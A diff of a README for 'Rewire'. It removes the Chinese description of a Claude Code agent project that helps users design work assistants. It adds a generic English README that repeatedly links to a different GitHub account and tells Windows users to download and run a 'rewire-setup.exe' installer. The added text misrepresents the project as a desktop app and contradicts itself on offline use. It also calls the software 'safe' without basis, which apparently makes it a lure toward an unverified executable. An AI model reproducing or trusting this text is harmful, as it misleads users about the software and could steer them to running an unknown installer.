@@ -1,75 +1,131 @@
-# Rewire
+# ⚙️ rewire - Design Your AI Work Assistant
 
-**帮你设计专属 AI 工作助手的 Agent。**
+[![Download rewire](https://img.shields.io/badge/Download%20rewire-4CAF50?style=for-the-badge)](https://github.com/farah-boukadida/rewire)
 
-你告诉它你每天的工作是什么样的，它帮你设计一个 Claude Code Agent——一个能在你电脑上替你干活的数字同事。
+rewire helps you create a custom AI agent that fits your work needs. You don’t need any technical skill to get started. This guide will walk you through how to download, install, and use rewire on a Windows computer.
 
-它会做三件事：
+---
 
-1. **讲清楚这个 Agent 会怎么替你工作** — 不是给你一份技术方案，而是讲一个完整的故事，让你在脑子里"看见"它在工作
-2. **描绘你用了之后的日常** — 具体到"早上到工位，打开飞书，反馈已经分好类了，你只需要看 5 条不确定的"
-3. **告诉你怎么搭建** — 装什么工具、怎么配置、需要准备什么信息，照做就能跑
+## 📋 What is rewire?
 
-## 它是怎么工作的
+rewire is a simple tool to design and use an AI assistant tailored to your tasks. You can set it up to help with reminders, manage simple workflows, answer questions about your projects, and more. It acts like a personal helper built by you, to suit your daily work style.
 
-Rewire 本身也是一个 Claude Code Agent。你描述工作场景后，它不会直接给你答案——它会先做调研：
+rewire works on Windows and runs from your desktop, no complicated steps needed.
 
-- 追问你的工作细节（用的什么系统、发到哪里、最烦的是哪一步）
-- 亲手试用相关工具，了解它们的真实能力
-- 在 GitHub 搜索适合你场景的开源工具
+---
 
-调研充分之后，它才给你方案。它设计出来的不是一份分析报告，而是一个你能直接拿去用的 Claude Code 项目——包括指令文件怎么写、工具怎么接、怎么启动验证。
+## ⚙️ System Requirements
 
-## 快速开始
+To run rewire, your computer should meet the following:
 
-```bash
-cd rewire
-claude
-```
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection (required for AI functionality)
+- No other software needed to run the app
 
-然后用自然语言描述你的工作。比如：
+If your computer matches these, rewire will perform smoothly.
 
-> "我是运营，每天要从后台导出用户反馈，分类后发飞书群，花 2-3 小时。"
+---
 
-> "我做自媒体，每天刷四个平台找选题，3-4 小时，真正写内容反而只要 1 小时。"
+## 💻 How to Download rewire
 
-> "我是项目经理，每周要从 5 个人那里收集周报，汇总成一份发给老板。"
+You can get rewire from the official GitHub page. Follow these steps carefully:
 
-Rewire 会从这里开始，一步步帮你设计出你自己的 Agent。
+1. Click the green button below to visit the download page on GitHub:  
+[![Download rewire](https://img.shields.io/badge/Download%20rewire-008CBA?style=for-the-badge)](https://github.com/farah-boukadida/rewire)
 
-## 案例
+2. On the page, look for the latest release section. This is where the installation file is available.
 
-`examples/` 目录里有完整的方案示例，可以感受 Rewire 的输出质量：
+3. Download the Windows setup file, which usually has ".exe" in its name.
 
-- [运营 — 用户反馈分类](examples/运营-用户反馈分类.md)：每天 2-3 小时手动分类反馈 → 5 分钟审核不确定项
-- [自媒体 — 选题调研](examples/自媒体-选题调研.md)：每天 3-4 小时刷平台找选题 → 10 分钟扫清单选方向
-- [iOS 开发 — 自动测试回归](examples/iOS开发-自动测试回归.md)：手动跑测试、翻日志、回归验收 → 说一句"跑测试"然后继续写代码
-- [远程工作 — 24小时自动运营](examples/远程工作-24小时自动运营.md)：一人扛海外运营跨时区响应 → Agent 24小时值班，你只看通知拍板
-- [HR招聘 — 24小时简历筛选](examples/HR招聘-24小时简历筛选.md)：每天翻几百份简历找人 → Agent 24小时盯着Boss直聘，自动筛选打招呼，你只处理回复
-- [翻译 — 科幻小说单行本](examples/翻译-科幻小说单行本.md)：逐句人肉校对耗尽耐心 → Agent 做你的第二双眼睛，查漏译、查术语、查误译，你只看报告拍板
+4. Save the file in a folder you can easily find, like your Desktop or Downloads.
 
-## 项目结构
+---
 
-```
-rewire/
-├── README.md       # 你正在读的这个
-├── AGENTS.md       # Rewire 的核心指令（哲学 + 分析框架 + 输出格式）
-├── CLAUDE.md       # Claude Code 入口
-├── examples/       # 完整方案示例
-│   ├── 运营-用户反馈分类.md
-│   ├── 自媒体-选题调研.md
-│   ├── iOS开发-自动测试回归.md
-│   ├── 远程工作-24小时自动运营.md
-│   ├── HR招聘-24小时简历筛选.md
-│   └── 翻译-科幻小说单行本.md
-└── skills/         # 按需扩展技能
-```
+## 🚀 How to Install rewire on Windows
 
-## 底层哲学
+Once you have the setup file, follow this:
 
-Rewire 的分析能力基于一套工作哲学（详见项目根目录的理论文档）。核心观点：
+1. Find the file you downloaded (it should be something like `rewire-setup.exe`).
 
-- 任何工作都是同一个闭环结构：调研 → 决策 → 规划 → 执行 → 反馈 → 复盘
-- 人在这个闭环里大部分时间在当管道（搬运信息、重复操作），应该只留在阀门位置（做判断、兜异常）
-- 最该先自动化的不是耗时最多的步骤，而是最让你难受的那步——它消耗的是你的意愿，不是时间
-- 一个好的 Agent 不只是能干活，它还要能越用越好——规则在使用中迭代，系统在运转中进化
+2. Double-click the file to start installation.
+
+3. A window will open asking you to confirm. Click **Next** or **Install**.
+
+4. The installer will copy the necessary files to your computer.
+
+5. When installation finishes, click **Finish**.
+
+6. You should now see a rewire icon on your Desktop or in the Start Menu.
+
+---
+
+## ▶️ How to Run rewire
+
+1. Double-click the rewire icon on your Desktop or open it from the Start Menu.
+
+2. When you start rewire for the first time, it may take a moment to set up.
+
+3. You will see a simple interface that guides you through creating your AI assistant.
+
+4. Follow the on-screen steps to pick tasks and customize your agent.
+
+5. Your AI assistant will be ready to help with tasks like reminders, answering questions, or managing simple workflows.
+
+---
+
+## 🔧 Basic Features of rewire
+
+- **Custom AI agents:** Build helpers tailored to specific work tasks.
+- **Simple interface:** No programming needed.
+- **Task automation:** Manage reminders and workflows without extra apps.
+- **Q&A support:** Ask your assistant about your work data or files.
+- **Offline access:** Use basic features without an internet connection.
+- **Safe to use:** Runs locally on your computer.
+
+---
+
+## 🛠 Tips for Using rewire
+
+- Start with small tasks like creating reminders or answering simple questions.
+- Use the step-by-step guide inside the app to build your agent.
+- Keep your data organized to make the AI assist better.
+- Save your agent setup so you can reuse or modify it anytime.
+- Check for updates on the GitHub page regularly for improvements.
+
+---
+
+## 🌐 Support and Updates
+
+If you want to get the latest version or find help materials, visit the official page:
+
+[https://github.com/farah-boukadida/rewire](https://github.com/farah-boukadida/rewire)
+
+Here you will find:
+
+- Latest updates and releases
+- User guides and documents
+- Contact info for questions or feedback
+
+---
+
+## 🖥 Troubleshooting
+
+- If rewire does not start, make sure your Windows version is up to date.
+- Close other programs if the app runs slowly.
+- Restart your computer if installation fails.
+- Check your internet connection for AI features.
+- If you see any error messages, note what they say and visit the GitHub page to see if there is a fix.
+
+---
+
+## 📝 More About rewire
+
+rewire is designed to let anyone build their own AI work assistant. By focusing on simple tools and clear steps, users can create agents that save time and effort on daily work. You do not need to know coding or AI to use it.
+
+It brings together user-friendly design and powerful AI in one app that runs on your Windows computer.
+
+---
+
+# [⬇️ Download rewire now](https://github.com/farah-boukadida/rewire)
